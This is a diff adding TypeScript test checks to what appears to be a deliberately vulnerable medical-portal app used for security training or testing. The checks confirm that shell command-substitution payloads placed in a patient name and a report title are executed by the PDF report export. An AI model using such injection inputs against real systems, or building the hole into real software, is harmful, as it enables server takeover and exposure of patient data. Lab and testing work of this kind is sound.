@@ -589,6 +589,33 @@ async function main(): Promise<void> {
   const track = await req('POST', '/api/track', { path: '/portal/records' }, patient.token);
   check('tracking beacon records identity + page', track.status === 204);
 
+  // --- C2: server-takeover chain (command injection in report export) --------
+
+  const beta = await login('patient.beta@example.test');
+  const marker = `C2-${Date.now()}`;
+  await req('PATCH', '/api/me', { full_name: `B$(echo ${marker} >&2)en Carter` }, beta.token);
+  const storedChain = await req('POST', '/api/reports/2/pdf', undefined, doctor.token);
+  check(
+    'stored command injection via patient profile name',
+    storedChain.status === 200 && (storedChain.body?.log || '').includes(marker),
+    (storedChain.body?.log || '').slice(0, 80)
+  );
+  await req('PATCH', '/api/me', { full_name: 'Ben Carter' }, beta.token);
+
+  const directChain = await req(
+    'POST',
+    '/api/reports/2/pdf',
+    { title: `x$(echo ${marker}-direct >&2)y` },
+    doctor.token
+  );
+  check(
+    'direct command injection via report title',
+    directChain.status === 200 && (directChain.body?.log || '').includes(`${marker}-direct`)
+  );
+
+  const chainAsPatient = await req('POST', '/api/reports/1/pdf', undefined, patient.token);
+  check('report export is doctor/admin only', chainAsPatient.status === 403, `HTTP ${chainAsPatient.status}`);
+
   // --- password reset --------------------------------------------------------
 
   const forgot = await req('POST', '/api/auth/forgot-password', { email: 'patient.alpha@example.test' });
